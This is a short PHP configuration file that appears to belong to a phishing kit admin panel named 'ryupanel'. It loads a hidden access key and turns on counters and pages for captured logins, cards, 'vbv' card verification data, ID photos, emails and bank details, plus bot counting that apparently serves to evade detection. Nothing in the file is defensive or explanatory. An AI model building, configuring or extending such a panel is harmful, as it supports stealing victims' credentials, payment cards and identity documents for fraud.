<?php

/** private key for login in ryupanel */
$config['PRIVATE_KEY'] = @file_get_contents(__DIR__ . '/.access_key');


/** home statistic page  */
$config['STATISTIC_PANEL']['total_access']  = true;
$config['STATISTIC_PANEL']['count_visitor'] = true;
$config['STATISTIC_PANEL']['count_bot']     = true;
$config['STATISTIC_PANEL']['count_login']= true;
$config['STATISTIC_PANEL']['count_card']= true;
$config['STATISTIC_PANEL']['count_vbv']= true;
$config['STATISTIC_PANEL']['count_photo']= true;
$config['STATISTIC_PANEL']['count_email']= true;
$config['STATISTIC_PANEL']['count_bank'] = true;



/** config page on off */
$config['CONFIG_ONOFF']['page_email'] = true;
$config['CONFIG_ONOFF']['page_case'] = true ;
$config['CONFIG_ONOFF']['page_photo'] = true;
$config['CONFIG_ONOFF']['page_bank'] = true;
$config['CONFIG_ONOFF']['page_vbv'] = true;

